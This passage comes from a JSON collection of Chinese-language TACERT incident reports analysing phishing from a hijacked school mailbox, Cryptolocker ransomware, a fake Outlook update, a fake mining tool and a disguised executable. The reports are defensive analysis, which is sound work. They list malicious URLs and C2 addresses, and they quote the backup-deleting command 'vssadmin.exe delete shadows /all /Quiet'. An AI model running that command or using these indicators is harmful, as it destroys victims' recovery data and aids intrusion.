件者的回信,而信件主旨為RE: for you,信件內容為一段英文(含下載連結) 與測試信內容。 5. 在2019/10/3 上午1:51 本中心寄測試信的信箱再次收到來自hsxx99@edu.tw 寄件者的回信,信件主旨仍然為RE: for you,而信件內容為一段新的英文(含 下載連結)與測試信內容。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 在2019/10/03 同一天",
        "Page_Num": "1,2,3,4"
    },
    "268": {
        "File_Name": "個案分析-假冒寄件者回信之網路釣魚攻擊事件分析報告_10811.pdf",
        "content": "有另一個教網中心也收到來自hsxx99@edu.tw 信箱的回 信,而且信件時間為上午1:58,與2019/10/03 上午1:51 信件主旨RE: for you 的信寄信時間接近。 7. 依照收到回信的時間,整理整個事件發生的時間順序如下圖。為了解這些可 疑郵件的攻擊行為與對收信者的危害程度,本中心對四封來信進行檢測。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 二、事件檢測 1. 首先,使用微軟的 Message Header Analyzer 分析第一封2019/9/27 來信的網 際網路標題,從Received headers 內容發現該信由 atl4mhob11.registeredsite.com(美國IP:209.17.115.49)所寄出,非來自寄件者所 在地台灣(.tw),表示寄件者名稱hsxx99@edu.tw 是偽造的。 2. 查看信件內容發現一個連結ATTACHMENT DOCUMENT,點擊後會開啟網 址https://barawey.com/wp-content/uploads/2019/09/link/inv_4790.zip,但是檔案 找不到。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 檢視第二封2019/10/1 來信的網際網路標題,從Received headers 內容發現該 信由qproxy2.mail.unifiedlayer.com (美國IP:69.89.16.161) 所寄出,非來自寄 件者所在地台灣(tw),表示寄件者名稱hsxx99@edu.tw 是偽造的。 4. 由第二封2019/10/1 來信的內容,發現與第一封來信相同,存在一個連結 ATTACHMENT DOCUMENT ,點擊該連結會開啟網址 https://www.petrousorth.com/wp-content/uploads/2019/09/cabl/inv_46394655.zip 。 接著會下載一個檔名為RESN4998003289934_396600 的zip 壓縮檔,解壓縮 後會看到一個檔名為RESN49980032899",
        "Page_Num": "4,5,6"
    },
    "269": {
        "File_Name": "個案分析-假冒寄件者回信之網路釣魚攻擊事件分析報告_10811.pdf",
        "content": "34_396600.js 的Jscript 指令檔。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 以記事本開啟RESN4998003289934_396600.js 後會看到一堆變數設定,而當 此檔案被讀取時,程式wscript.exe 的執行會使CPU 使用率高達100%。 5. RESN4998003289934_396600.js 經Virustotal 檢測,其惡意比例為4/54,僅有 少數防毒軟體可以識別它的存在,而且它被防毒軟體公司視為一個 Downloader(下載器)。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 以IE 開啟RESN4998003289934_396600.js 後會出現檔案下載的視窗,隨後出 現詢問是否要開啟或下載RESN4998003289934_396600.js 的視窗,若選擇開 啟舊檔,則會出現「fVR.exe 與Windows 64 位元版本不相容,無法啟動或執 行」的視窗。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 在C:\\使用者\\...\\AppData\\Local\\Temp 資料夾內,發現fVR.exe,它經virustotal 檢測,其惡意比例為0。從隨後出現的Windows Script Host 視窗內容,得知 RESN4998003289934_396600.js 的Script 內容有錯誤發生,因fVR.exe 與 Windows 64 位元版本不相容,因此可以判定fVR.exe 為執行 RESN4998003289934_396600.js 後所產生。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 檢視第三封2019/10/3 來信的網際網路標題,從Received headers 內容發現該 信由vsmx001.mijndomein.xion.oxcs.net(德國IP:157.97.78.141) 所寄出,非來 自寄件者所在地台灣(tw),表示寄件者名稱hsxx",
        "Page_Num": "6,7,8,9,10"
    },
    "270": {
        "File_Name": "個案分析-假冒寄件者回信之網路釣魚攻擊事件分析報告_10811.pdf",
        "content": "99@edu.tw 是偽造的。 9. 查看第三封2019/10/3 來信的內容,發現與前兩封來信相同,存在一個連結 ATTACHMENT DOCUMENT ,點擊該連結會開啟網址 http://elliptisquare.pt/cp/images/crow/contract_50116235.zip。 10. 接著會下載一個檔名為intuition150114868 的zip 壓縮檔,解壓縮後會看到一 個檔名為intuition150114868 的VBscript 指令檔,而且該檔案是在第三封信寄 出的前一天2019/10/2 下午10:35 被修改完成。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11. 編輯intuition150114868.vbs 的內容,會看到一堆Function wjQPMC 的變數設 定。 直接執行intuition150114868.vbs 會出現Windows Defender 所給的提醒視窗, 提到檢查檔案0x21793,沒有偵測到惡意行為。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 點擊「確定」後,出現另一個來自MS Excel 的視窗,提到reogXFKTgJest 不 能被執行,請稍後再試(0x21793)。 12. 檢視主機背景程式運作情形,發現C:\\Users\\...\\AppData\\Local\\Temp 資料夾內 有一個CQHIUJh.exe 正在執行,而且此檔案會呼叫cmd.exe 來執行Ping.exe 檢查主機的網卡與用calc.exe 替換原舊有的CQHIUJh.exe。 檢視CQHIUJh.exe 的內容,發現該檔案在執行當下時間被修改成一個 Windows 小算盤。 13. CALC.EXE 與CQHIUJh.exe 經Virustotal 檢測,其惡意比例為0/70。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team intuition150114868.vbs 經Virustotal 檢測,其惡意比例為3/55,僅少數防毒軟體 公司能識別該檔案之惡意行為。 14.",
        "Page_Num": "10,11,12,13"
    },
    "271": {
        "File_Name": "個案分析-假冒寄件者回信之網路釣魚攻擊事件分析報告_10811.pdf",
        "content": "在執行intuition150114868.vbs 之後,最後會開啟小算盤,該小算盤不會產生 惡意行為,推測此作法可能是駭客在測試如何將惡意程式透過郵件散播到主 機內。 15. 查看2019/10/3 教網中心所收到來信的內容,發現與前面三封來信相同,存在 一個連結ATTACHMENT DOCUMENT ,點擊該連結會開啟網址 http://greenknowledge.ro/wp-admin/job/contract_48.zip。  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 接著會下載一個檔名為intuition135291261 的zip 壓縮檔,解壓縮後會看到一 個檔名為intuition135291261 的VBscript 指令檔,而且該檔案是在該封信寄出 的前一天2019/10/2 下午10:35 被修改完成,與第三封信下載的 intuition150114868.vbs 的檔案修改時間相同。 16. intuition135291261.vbs 經Virustotal 檢測,其惡意比例為2/55,僅少數防毒軟 體公司能識別該檔案之惡意行為。  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 17. 編輯intuition135291261.vbs 的內容,會看到一堆亂數排列的中文。 18. 當執行intuition135291261.vbs 一段時間後,會出現Script 錯誤的視窗訊息。  15 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、事件攻擊行為示意圖 1.駭客駭入校園雲端電子郵件系統的hsxx99 信箱。 2.駭客取得使用者hsxx99 信箱內收件匣信件與所有來信者資訊。 3.依照收件匣信件內容偽裝成使用者hsxx99 回信給使用者A。 4.使用者A 開啟回信後點擊惡意連結ATTACHMENT DOCUMENT。 5.透過惡意連結引導使用者A 下載惡意檔案至使用者A 主機內。 四、總結與建議 1. 經信箱所有者與信箱管理單位確認公務信箱hsxx99@mail.",
        "Page_Num": "13,14,15,16"
    },
    "272": {
        "File_Name": "個案分析-假冒寄件者回信之網路釣魚攻擊事件分析報告_10811.pdf",
        "content": "edu.tw 的狀 態,得知該信箱曾有來自國外IP 的異常存取紀錄,確認該信箱有被駭現 象。 2. 從駭客的攻擊行為得知,本案非一般的隨機釣魚攻擊事件,駭客在取得受 駭信箱內所有信件後,以回信方式對所有來信者進行釣魚攻擊,想透過這 些人曾經寫過的信件內文來誘騙收到釣魚信的收件者。 3. 從第2~4封信件所附連結ATTACHMENT DOCUMENT下載至主機的Java  16 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team Script 檔與VB Script 檔執行情形,推測駭客可能在測試如何將惡意程式 透過郵件散播到主機內。 4. 針對本類型的釣魚攻擊事件,有下列預防措施提供使用者參考。 (1) 不隨意開啟不明來源的信件(/附件檔)或點擊不明來源的夾帶連結。 (2) 定期更換電子郵件信箱的登入密碼,並加強密碼強度。 (3) 若收到可疑的信件內容,建議親自與寄件者確認信件內容的正確性。 (4) 定期進行防毒軟體的病毒碼更新,確保主機能第一時間阻擋病毒攻擊。 (5) 定期進行電子郵件信箱的重要信件備份。 (6) 定期進行電腦主機資料備份。 ",
        "Page_Num": "16,17"
    },
    "273": {
        "File_Name": "個案分析-假勒索真破壞的惡意程式 Cryptolocker事件分析報告_10410.pdf",
        "content": "個案分析- 假勒索真破壞的惡意程式 Cryptolocker 事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2015/10  2 I. 事件簡介 1. 近年來惡意程式越來越多樣化,以往都只是感染主機成為中繼站或殭屍電 腦,但另一種的惡意程式卻會破壞使用者的檔案資料,並且勒索使用者相 當的金額,造成嚴重損害。 2. 學術網路中的確有部分主機遭受過惡意勒索軟體(ransomware)的侵害,然 而往往找不出明確的感染途徑及惡意程式樣本。 3. 受害者往往必須向駭客支付比特幣作為檔案的解密贖金。 4. 本單位取得的惡意程式樣本進行研究分析,主要以Cryptolocker 的惡意 勒索軟體測試。 II. 事件檢測 1. 使用VM 虛擬主機並且為Windows 7 系統進行隔離環境測試。 2. 惡意程式樣本名稱為 128[...]d90.exe,實際執行後會先跳出權限存取的 選項,此指令會刪除磁碟的快照備份,讓使用者無法還原系統。 “vssadmin.exe delete shadows /all /Quiet” 3. 原本的惡意程式會開始針對內部文件、影音、圖像檔案進行加密,然後惡 意程式主體就會自我刪除。 4. 此時會顯示惡意程式執行的紅色視窗,告知使用者你的檔案已經被加密, 而桌面的背景也會備置換成勒索軟體的相關訊息。  3 5. 惡意程式會威脅使用者必須在96 小時內將贖金透過以下方式付款到駭客 的比特幣的電子錢包中,並告知此加密是透過RSA-2048 方式,必須用贖 金來取回加密的私鑰。 6. 透過Virustotal 線上掃毒,該病毒的檢測比例 45/57 相當高,為 Cryptolocker 系列的勒索軟體。 7. 測試時候將其中一個資料夾內放入一些文件檔,包含了docx、xlsx、jpg、  4 pdf 四種格式檔案做測試,而惡意程式感染後所有文件檔案的附檔名都會 變成ecc 格式,導致磁碟中所有文件檔案都無法開啟。 8. ",
        "Page_Num": "1,2,3,4"
    },
    "274": {
        "File_Name": "個案分析-假勒索真破壞的惡意程式 Cryptolocker事件分析報告_10410.pdf",
        "content": "當所有磁碟內部的關聯檔案都被加密後,在桌面中產生三個說明檔案,分 別為「CryptoLocker.lnk、HeLP_ReSTORe_FILeS.bmp 和 HELP_RESTORE_FILES.txt」,其內容都是引導受害者如何進行繳付勒索贖 金。  5 9. 惡意程式執行後會自動開啟CryptoLocker 捷徑檔案,該惡意程式檔名為 ynlgwty.exe,此程式存於C 槽的隱藏資料夾中「\\AppData\\Roaming\\」, 就是自動跳出的紅底黑字視窗程式。  6 10. 該程式同時會寫入開機自動啟用註冊檔中,程序名稱為 msdedf,檔案 路徑為 「\\roaming\\ynlgwty.exe」。 11. 開啟惡意程式 ynlgwty.exe 提供的三個贖金網站網址 「http://tkj3higtqlvohs7z.aw49f4j3n26.com、 http://tkj3higtqlvohs7z.dfj3d8w3n27.com 、  7 https://tkj3higtqlvohs7z.s5.tor-gateways.de/」,一般瀏覽器都無法 正常開啟。 12. Tor Browser 為匿名網路瀏覽器,也就是透過該瀏覽器作為中繼代理, 進而能夠連線到一般DNS 無法解析的網站,為一種中繼網路。此例表示我 們會使用185.73.44.58 作為中繼代理,去連到匿名的贖金網站。 13. 因為前三個贖金網址都無法開啟,改用匿名網路瀏覽器 Tor Browser 開啟第四個匿名網址「http://tkj3higtqlvohs7z.onion/」,然而也無法 正常顯示,判斷可能該惡意贖金網站已經被移除。  8 14. Tor Browser 連線的位址185.73.44.58 為匿名中繼網路的其中一個主 機,從本地端無法明確追查到惡意網址,故Tor onion network 常用來作 為犯罪匿名網路使用。 15. 從網路封包中可以看到,主機感染後惡意程式ynlgwty.exe 一開始會連 ",
        "Page_Num": "4,5,6,7,8"
    },
    "275": {
        "File_Name": "個案分析-假勒索真破壞的惡意程式 Cryptolocker事件分析報告_10410.pdf",
        "content": "到網站「http://ipinfo.io」,IP 為美國的52.28.168.5,該網站會回覆 連線主機的IP 資訊,可能是作為之後的報到用途。 16. 當主機取得IP 資訊後惡意程式會轉向德國的192.251.226.206:137 發 送Netbois 協定的UDP 封包,一般做為同網段網路芳鄰探測使用,此處研  9 判可能為向上層中繼站報到。 17. 透過Virustotal 檢測此網站 192.251.226.206,發現到有一家防毒引 擎偵測為惡意網址,因此懷疑可能為駭客所用。 18. 隨後惡意程式ynlgwty.exe 會再向網址secure2.alphassl.com 的port 80 連線,位址為美國的 104.16.28.16,GET 取得一個名為 gsalphag2.crt 憑證公鑰,為產生惡意程式加密檔案私鑰。  10 19. 惡意程式會向 ocsp.globalsign.com,IP 為108.162.232.204 進行 HTTP GET 連線存取,封包中會回傳一串加密參數,應為惡意程式加密用 的私鑰。 20. 主機感染後無法透過Tor 匿名網路開啟贖金網站,可能贖金網站已經被 相關單位撤除,換言之一旦感染此惡意程式無法還原資料。  11 III. 網路架構圖 192.251.226.206:137 德國 Netbios UDP 受害使用者 ipinfo.io 美國 52.28.168.5 STEP 2 取得主機IP 惡意程式 CryptoLocker secure2.alphassl.com 美國 104.16.28.16 駭客 STEP 1 執行惡意程式 中繼代理主機 185.73.44.58 STEP 6 Tor Browser 匿名網路 STEP 3 感染報到 STEP 4 下載 crt 憑證公鑰 贖金網站 tkj3higtqlvohs7z.onion STEP 7 無法開啟贖金 網站 散播惡意程式 ocsp.globalsign.com 美國 108.162.232.204 STEP 5 HTTP GET 回傳 加密私鑰 監控網站 1.",
        "Page_Num": "8,9,10,11"
    },
    "276": {
        "File_Name": "個案分析-假勒索真破壞的惡意程式 Cryptolocker事件分析報告_10410.pdf",
        "content": "使用者可能透過瀏覽器或系統漏洞誤執行到惡意程式Cryptolocker。 2. 主機感染惡意程式後向網站「ipinf.io」取得IP 位址。 3. 惡意程式開始向192.251.226.206 發送netbios 協定封包進行報到。 4. 惡意程式向secure2.aplpassl.com 下載crt 憑證公鑰。。 5. 惡意程式向ocsp.globalsign.com HTTP GET 回傳加密私鑰。 6. 受害者必須透過Tor Browser 進入洋蔥匿名網路,使用中繼代理主機。 7. 無法開啟贖金網站,可能該網站已經被相關單位撤除。 8. 駭客能持續監控贖金網站以及散播惡意程式。 IV. 建議與總結 1. 使用者可能透過被APT 攻擊或網路下載執行到惡意程式而遭受感染,目前 有多數人回報是透過瀏覽器就莫名遭受感染,並未下載執行到可疑檔案。 2. 主機一旦被感染後,惡意程式會開始加密所有磁碟中的文件檔、圖片檔和 影音檔案。  12 3. 惡意程式一旦加密完各類檔案後會自我刪除,不讓使用者取得惡意程式。 4. 惡意程式隨後會更改系統桌面以及跳出程式紅底畫面,引導受害者如何去 支付贖金來取得解密私鑰。 5. CrytoLokcer 號稱使用RSA-2048 加密,因為沒有私鑰基本上是無法救回 檔案,建議使用者要定期備份重要資料避免無法挽回。 6. 理論上感染惡意程式後可以透過 Tor Browser 開啟匿名贖金網站,然而 此例測試發現無法開啟,應該是贖金網站已經被撤除,故若使用者感染此 惡意程式則無法取得私鑰還原。 7. 建議使用者將系統重新安裝,避免病毒遺留的影響往後可能再次發生。 8. 建議使用者將作業系統更新,並且更新常用套件如Adobe Flash Player、 Adobe Reader、Java 等,這些漏洞都有可能導致感染Cryptolocker 勒索 程式。 ",
        "Page_Num": "11,12"
    },
    "277": {
        "File_Name": "個案分析-偽裝成Outlook更新檔案之惡意程式_10302.pdf",
        "content": "個案分析- 偽裝成Outlook 更新檔案 之惡意程式事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2014/02  1 I. 事件簡介: A. 近期網路上出現一個疑似Outlook 郵件收發軟體的更新檔案,檔案解壓縮 後為『Outlook.exe』,此檔已被Virustotal 偵測出為惡意程式。 B. 其他相關事件報導網址 1. http://blog.dynamoo.com/2013/11/important-new-outlook-settings-spam.ht ml 2. http://techhelplist.com/index.php/spam-list/383-important-new-outlook-set tings-virus II. 事件檢測: A. 透過VMware 虛擬機器,並使用Win7 (x64)及Wireshark 封包側錄。 B. 執行惡意程式『outlook.exe』後,會呼叫WinMail.exe 至 「http://crl.microsoft.com/pki/crl/products/」取得 “microsoftrootcert.crl” 和 “MicCodSigPCA_08-31-2010.crl” 憑證撤銷清單。 1. 接著會透過HTTPS 連線至『dchamt.com』,該主機Port 443 疑似被利 用來接受感染主機的報到訊息,加密訊息中帶有明文dchamt.com。 2. 此網域名稱已被部分的防毒軟體判定為惡意網址,解析出來是位於印 度的IP「216.157.85.173」,但反解析的網域名稱為 「ns1.dotcominfotech.co.in」且Port 53 是OPEN,應同時為一台DNS  2 Server。 圖、此為上層報到用主機的頁面 3. 隨後會再向『http://khandelwalschool.org』下載 /images/heap.exe,網域 名稱解析出的IP 同為216.157.85.173,明顯被駭客入侵註冊惡意網域 做為跳板。  3 C. 執行惡意程式『outlook.exe』後,防火牆會詢問是否同意一個存取網路權 限程式『guowa.exe』的執行,允許存取確認",
        "Page_Num": "1,2,3,4"
    },
    "278": {
        "File_Name": "個案分析-偽裝成Outlook更新檔案之惡意程式_10302.pdf",
        "content": "後該程式將於背景執行,讓 使用者不易察覺異狀。  4 1. 透過procexp 可以看到該程式『guowa.exe』的相關資訊,藏匿於隱藏 目錄C:\\Users\\XXX\\AppData 底下,並會寫入註冊機碼開機自動執行。 2. 『guowa.exe』會開始進行網路的連線動作,會開啟本地端的TCP port 8485 和UDP port 2990 來接收命令資料。 3. 從紀錄上發現至少有43 個國家及155 筆相異IP 成功透過tcp port 8485 傳入指令要求大量資料回覆,但指令及資料都經過駭客加密。 4. 從紀錄上發現至少有163 個國家及10000 筆相異IP 成功透過udp port 2990 傳入指令要求小量資料回覆,但指令及資料都經過駭客加密。 5. 『guowa.exe』也會向「http://crl.geotrust.com/crls/」GET “secureca.crl” 憑 證撤銷清單。 D. 過一段時間後會再產生兩個惡意程式於背景執行,分別為 『turyfeswavaq.exe』和『dulegcozlegy.exe』,皆位在使用者的家目錄下, 並且都會寫入註冊碼開機後自動執行。  5 1. 『turyfeswavaq.exe』會開始感染系統的svchost.exe,並且複製自己成 另一檔案名稱『dot__57.exe』藏匿於隱藏目錄C:\\Users\\XXX\\AppData 下,並透過『guowa.exe』這支父程式進行呼叫。 2. 『dulegcozlegy.exe』與子程序『scvhost.exe』後期會開始有大量網路行 為,並且惡意程式會於“ C:\\Users\\whoami\\AppData\\Local\\Temp\\ ” 建立 一個工具資料夾「~tmp9C4642」,並執行裡面的檔案『xulrunner.exe』 來對外進行大量的資料傳送。  6  7 III. 側錄流量分析 A. 感染主機主要透過被開啟的Port 8485 和2990 來跟駭客的主機做溝通。 1. Port 2990 為UDP",
        "Page_Num": "4,5,6,7,8"
    },
    "279": {
        "File_Name": "個案分析-偽裝成Outlook更新檔案之惡意程式_10302.pdf",
        "content": "方式,收到UDP 指令後會以UDP 的方式回覆加密 資料。 2. Port 8484 為TCP 方式,收到TCP 指令後會回覆較大量的加密資料。 3. 因為UDP 的連線數遠大於TCP 的連線數,可能作為對底層殭屍電腦 的通訊方式,而TCP port 的則是上層駭客主機用來下達指令的方式。 B. 目前有觀察到一個明確通訊協定特徵為「AOL IM」,也是透過UDP Port 2990 與IP: 82.41.185.165 (英國)進行通訊,此為一種即時通Instant Messenger 的通訊協定,通訊內容也經過加密無法得知。 C. 感染的主機會對沒有來源設限的DNS Servers 進行大量的DNS query,可 能造成“DNS 放大攻擊”而影響正常服務。 1. 目前觀察到至少有119 個國家和5889 個DNS 主機IP 遭受影響。 2. 觀測連至臺灣主要的DNS 主機為 a. 140.117.X.X (本單位) b. 168.95.X.X (中華) c. 210.201.X.X (亞太) d. 119.160.X.X (Yahoo) e. 61.220.X.X , 203.73.X.X (TWNIC) f. 220.135.X.X (中華) D. 感染的主機對一些已知的惡意網站透過HTTP 的POST Method 傳送加密 資料,可能是主機的個人機密資料。目的端至少有40 個國家及535 個IP 位址。  8 E. 感染的主機會偽造寄件者名稱,大量發送惡意SPAM 郵件,至少有10000 個目的地郵件地址和83 個國家,檢查發現SPAM 郵件內裡查夾帶zip 壓 縮檔,解壓縮後為『BH_Remittance_Advice.pdf.exe』的病毒。誤執行就會 遭受感染成為殭屍電腦。 1. 其他郵件的惡意程式還有『Invoice.PDF.exe、Invoice_111813.exe』兩 種。  9 IV. 網路行為架構圖 Internet Hacker STEP 1 : 感染主機",
        "Page_Num": "8,9,10"
    },
    "280": {
        "File_Name": "個案分析-偽裝成Outlook更新檔案之惡意程式_10302.pdf",
        "content": "透過 HTTPS 向 dchamt.com 進行報到。 STEP 2 : 報到後會下載一個惡意程式 heap.exe 並執行。 STEP 3 : 感染主機會開啟埠號 UDP 2990 和 TCP 8485 與外部主機和駭客進行通訊。 STEP 4 : 感染主機會對無設限制的DNS主機進行DNS查詢放大攻擊。 STEP 5 : 感染主機會發送大量的SPAM Mails,並且夾帶惡意檔案。 感染主機 dchamt.com STEP 1 感染報到 STEP 2 報到下載執行 STEP 3 udp 2990 & tcp 8485 STEP 4 DNS query STEP 5 SPAM Mails DNS Servers Mail Servers STEP 3 駭客命令 outlook.exe dchamt.com報到 guowa.exe Tcp & Udp dulegcozlegy.exe 網路通訊 xulrunner.exe 網路通訊 turyfeswavaq.exe 網路通訊 DNS Query 外部DNS查詢 HTTP POST 傳送加密資料 SPAM Mails 發送惡意郵件 heap.exe 執行guowa.exe  10 V. 結論 A. 此程式Outlook.zip 主要誤導使用者以為是Office Outlook 更新檔案,實質 上為惡意的後門程式。 B. 該惡意程式會在資料夾下產生許多子程式來控制網路的行為,也可能成為 駭客的中繼站或C&C 主機。 C. 駭客透過該檔案感染使用者主機後取得該主機個人資料,並且成為殭屍跳 板主機對其他主機進行攻擊,例如DNS Query 放大攻擊或發送惡意釣魚 郵件。 VI. 建議措施 A. 若不幸誤點此惡意程式後可以先拔除網路線或關閉網路,以降低損害程 度。 B. 安裝並更新防毒軟體進行系統磁槽的病毒掃描。 C. 利用工作管理員或Procexp 工具來強制關閉背景的惡意程式,並且手動刪 除。 D. 利用autoruns 工具或執行msconfig 來關閉開機自動執行的惡意程式登錄 檔。 E. 使用Tcpview 檢查網路連線狀態是否還有異常。 F. 若擔心無法完整清除,建議備份檔案後",
        "Page_Num": "10,11"
    },
    "281": {
        "File_Name": "個案分析-偽裝成Outlook更新檔案之惡意程式_10302.pdf",
        "content": "重新安裝作業系統,以確保無惡意 程式殘留。 ",
        "Page_Num": "11"
    },
    "282": {
        "File_Name": "個案分析-偽裝成挖礦工具的惡意程式分析報告_10412.pdf",
        "content": "1 個案分析- 偽裝成挖礦工具的惡意程式 分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2015/12  2 I. 事件簡介 1. 隨著加密數位貨幣的流行,越來越多人開始使用數位貨幣例如比特幣, 因此許多駭客提供免費的比特幣挖礦工具讓使用者使用。 2. 網路上很多的免費挖礦工具常見的如cpuminer 或gpuminer,分別透過 CPU 和GPU 處理器進行雜湊運算,以開採運算出新的比特幣。 3. 然而這些工具大多是指令介面,不方便一般人使用,故駭客故意製作出 圖形化介面的挖礦工具,實質上卻是惡意程式讓主機成為殭屍電腦。 4. 本事件測試一隻為 Silent Miner Botnet.exe 的惡意程式。 II. 事件檢測 1. 使用VM 虛擬主機並且為Windows 7 (x64)系統進行隔離環境測試。 2. 惡意程式樣本名稱為 Silent Miner Botnet.exe 執行檔,測試過程中會 側錄其網路行為進行分析。 3. 該檔案執行後並不會有安裝的動作,而是直接跳出一個軟體視窗,且名 為「xBroken Silent Miner v1.5」。 4. 從該軟體視窗來看,看起來是數位貨幣挖礦工具會出現的資訊欄位,例 如pool(礦池IP)、port(通常是3333)、worker(礦工名稱)、 password(礦工密碼)。 5. 在視窗右側有個頁籤為 Compile Miner,將Compile 按鍵執行後會產生  3 一個惡意程式執行檔 Miner.exe,藏於C 磁碟的隱藏目錄中。 6. 透過Virustotal 掃描Silent Miner Botnet.exe 得到,該程式的偵測比 例為 36/55 的木馬程式。 7. 隨後執行惡意程式Miner.exe,會出現一個視窗並有之前輸入欄位的資 訊,似乎是告知使用者挖礦程序已經啟用。 8. 透過Virustotal 掃描Miner.exe,得知偵測比例為29/55 的惡意程式,  4 主要行為可能是耗用資源進行挖礦。 9. 在啟用 Silent Miner Botnet.",
        "Page_Num": "1,2,3,4"
    },
    "283": {
        "File_Name": "個案分析-偽裝成挖礦工具的惡意程式分析報告_10412.pdf",
        "content": "exe 後會先產生出一隻M.exe,並藏匿於 C:\\ 隱藏目錄下,該M.exe 程式會在去產生出另一隻監控程式 sysmon.exe 後關閉。 10. 該惡意程式M.exe 透過virustotal 掃描確定為 41/56 比例的木馬程 式。 11. 透過autoruns 檢查開機自動啟用區,可以得知惡意程式主體 sysmon.exe 藏匿於系統的隱藏資料夾中 C:\\ProgramData\\312220\\。  5 12. 透過procexp 檢查背景執行程式,發現到一隻隱藏的程式在背景執行, 名為 sysmon.exe,並且該程式會持續對外進行連線。 13. 檢查 sysmon.exe 所在位置以及連線目的IP,得知該程式會藏匿於系統 的隱藏資料夾中 C:\\ProgramData\\312220\\,並且會持續向目的 222.253.232.242:3333 傳送資料。 14. 通常來說port 3333 的確是一般礦池伺服器所接收用的通訊埠,然而該 程式sysmon 在此所扮演的腳色卻是木馬程式,只是用port 3333 來掩蓋 竊取資料,實質上並無進行挖礦動作,因為挖礦時必然消耗大量CPU 資 源,然而卻只是安靜在背景監控磁碟傳輸資料。 15. 透過Virustotal 掃描 sysmon.exe 得知,其就是偵測比例 41/56 的惡意 程式M.exe,故sysmon.exe 由M.exe 複製產生並藏匿於其他資料中。  6 16. 檢查執行惡意程式時產生的網路封包進行分析,初始時 silent miner botnet.exe 會先進行 HTTP GET 到 http://trainerpatchgta4.altervista.org/News.txt,也就是德國 88.198.2.208:80,主要內容為此程式的changelog 內容。 17. 接著sysmon.exe 開始持續向越南的 222.253.232.242:3333 進行 TCP SENT,內容為空資料,從封包紀錄來看該主機似乎已經被關閉,所以封 包送出後無回應,研判該主機應為駭客植入的一台",
        "Page_Num": "4,5,6"
    },
    "284": {
        "File_Name": "個案分析-偽裝成挖礦工具的惡意程式分析報告_10412.pdf",
        "content": "殭屍主機。  7 III. 網路架構圖 回報主機 BOT 越南 222.253.232.242:3333 使用者BOT trainerpatchgta4.altervista.org 德國 88.198.2.208:80 STEP 2 更新惡意程式 惡意程式 Silent miner botnet 駭客 STEP 1 安裝惡意程式 STEP 3 Sysmon.exe TCP SENT 竊取個資 散播惡意程式 監控網站 1. 使用者可能透過地下網站安裝到惡意程式 Silent miner botnet 成為 BOT。 2. 主機安裝惡意程式後向「88.198.2.208:80」報到並更新惡意軟體資訊。 3. Sysmon 惡意程式開始定期向上層BOT 主機回報。 4. 等待時機駭客可能透過回報主機下達攻擊指令,此時感染主機就會變成活 躍的殭屍電腦對外攻擊。  8 IV. 建議與總結 1. 建議使用者不要下載安裝此類的工具軟體,通常都內含木馬程式。 2. 駭客透過人性的弱點製作出一個視窗介面的挖礦工具,引誘用者安裝成 為殭屍電腦。 3. 很多殭屍電腦初期並無異狀,大多會等待上層C&C 主機下達指令時才會 發作攻擊其他主機。 4. 網路上很多開源免費的工具軟體,下載使用前最好進行防毒軟體掃描。 5. 一旦安裝到惡意程式,可以透過免費微軟的sysinternal 套裝工具進行 程式和網路連線檢查移除。 6. 定期做好資料備份,若該惡意程式具有加密勒索功能,可能會造成更嚴 重的損失。 ",
        "Page_Num": "6,7,8"
    },
    "285": {
        "File_Name": "個案分析-偽裝成文件格式的惡意執行檔事件分析報告_10603.pdf",
        "content": "個案分析- 偽裝成文件格式的惡意執行 檔事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 106 年3 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 該資安事件為測試網路上取得的惡意程式樣本並觀察其系統及網路行 為,分析可能對於電腦主機受到的損害。 2. 該惡意程式為偽裝成文件檔 TXT 的執行程式,名為 「output.108327170.txt」的EXE 檔案。 3. 通常這一類檔案多會依附在SPAM 垃圾郵件或APT 郵件中,誘使一般人開 啟並遭受感染。 4. 本單位透過使用 Win7(x64)系統的 VM 主機進行隔離測試,並且側錄其網 路封包進行分析。 II. 事件檢測 1. 首先將病毒樣本解壓縮後,圖示為PDF 字樣的EXE 執行檔,而檔名則是以 TXT 進行偽裝,「output.108327170.txt.exe」,系統預設不會顯示附檔名 EXE,不小心容易誤認為就只是一般的TXT 文件。 2. 該惡意程式在Virustotal 上很高的比例 46/59 被偵測為惡意程式。 3. 當執行「output.108327170.txt.exe」惡意程式後,該程式原始檔案便會 自我移除,讓使用者無法再次取得程式的樣本,如同加密勒索軟體般有自  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 我銷毀機制。 4. 約莫經過一段時間後系統背景開始出現一支名為 regsvr32.exe 程式正 在執行,透過 virustotal 檢測並非惡意程式。 5. 檢查regsvr32.exe 位置位於系統路徑 \\SysWOW64\\ 中,為系統內建的合 法程式,為惡意程式「output.108327170.txt.exe」呼叫執行的子程序。 6. 從連線的log 紀錄來看,regsvr32.exe 會大量對外部的 port 80 和 443 進行連線,",
        "Page_Num": "1,2,3"
    },
    "286": {
        "File_Name": "個案分析-偽裝成文件格式的惡意執行檔事件分析報告_10603.pdf",
